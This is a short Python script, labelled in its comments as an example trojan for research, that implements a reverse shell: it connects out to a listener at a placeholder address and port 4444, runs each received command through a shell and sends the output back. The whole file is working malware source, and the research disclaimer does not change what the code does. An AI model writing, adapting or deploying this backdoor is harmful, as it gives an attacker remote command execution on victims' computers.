# Created By: Tommie Navitskas 2023

# The following is an example of trojan that would enable an attacker to open a backdoor on a victim's computer and execute commands remotely.

# Please note that it is illegal to send this type of malware to an unsuspecting victim and is punishable with serious jail time. This is strictly for research purposes only.

import socket
import subprocess

HOST = '127.0.0.1'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send(output.stdout.read() + output.stderr.read())

s.close()
